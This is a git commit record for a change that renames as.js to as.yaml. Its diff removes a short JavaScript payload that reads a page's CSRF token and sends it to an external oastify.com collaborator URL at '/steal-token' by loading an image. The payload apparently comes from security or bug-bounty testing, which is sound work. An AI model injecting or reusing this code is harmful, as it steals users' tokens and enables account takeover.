67c15372eab3e72a362b01b04ad18b7e780558ba
0x1b <164749781+RHYru9@users.noreply.github.com>
2024-10-07 04:33:14 +0700

    Update and rename as.js to as.yaml

--- as.js
+++
@@ -1,6 +0,0 @@
-const tokenValue = document.querySelector('meta[name="csrf-token"]').getAttribute('content'); 
-const img = new Image(); 
-const attackerServerUrl = 'https://aaoxzv7im9wiiquk8o460slj3a91xrlg.oastify.com/steal-token';
-const url = `${attackerServerUrl}?stolen_token=${encodeURIComponent(tokenValue)}`;
-img.src = url;
-document.body.appendChild(img);
